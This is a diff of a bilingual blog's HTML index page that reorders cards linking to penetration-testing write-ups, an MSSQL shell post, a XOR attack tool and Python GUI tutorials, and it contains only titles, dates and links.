+      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">21 Jul 2016</time>
+      <time lang="el">21 Ιουλ 2016</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
     <div class="cell">
       <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
@@ -799,21 +991,9 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Enterprise write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Mar 2018</time>
-      <time lang="el">19 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
            
           
            
@@ -824,16 +1004,16 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
     </footer>
   </a>
 </article>
@@ -875,118 +1055,6 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
-      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Oct 2016</time>
-      <time lang="el">17 Οκτ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
           
            
            
@@ -1008,144 +1076,20 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 May 2018</time>
-      <time lang="el">13 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
            
           
            
@@ -1247,6 +1191,238 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
+      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Oct 2016</time>
+      <time lang="el">17 Οκτ 2016</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/node_writeup/" class="clearfix">
     <div class="cell">
@@ -1295,21 +1471,13 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Sep 2016</time>
-      <time lang="el">19 Σεπ 2016</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1319,21 +1487,17 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1367,21 +1531,9 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
            
           
            
@@ -1411,65 +1563,9 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/nl80211/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
-      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Oct 2016</time>
-      <time lang="el">09 Οκτ 2016</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1535,17 +1631,77 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1576,6 +1732,8 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
           
+          
+           
            
            
            
@@ -1583,321 +1741,237 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
            
+           
+          
+           
+           
+           
+           
           
            
            
            
+           
           
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
            
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_plain/" class="clearfix">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shutdown_button.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Creation of a shutdown GUI using Gtk in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας γραφικής διεπαφής κλεισίματος με τη χρήση Gtk σε Python</h3>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">21 Jul 2016</time>
-      <time lang="el">21 Ιουλ 2016</time>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
@@ -2220,78 +2294,6 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/oracle/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Ask and you shall receive</h3>
-      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">04 May 2019</time>
-      <time lang="el">04 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
-      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Apr 2018</time>
-      <time lang="el">22 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
           
            
            
@@ -2363,17 +2365,87 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
            
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
+  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
-      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
+      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
+      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">13 Apr 2018</time>
-      <time lang="el">13 Απρ 2018</time>
+      <time lang="en">22 Apr 2018</time>
+      <time lang="el">22 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -2434,40 +2506,21 @@ We can add some hooks to run a command or script after running apt-get by adding
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -2509,41 +2562,6 @@ We can add some hooks to run a command or script after running apt-get by adding
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
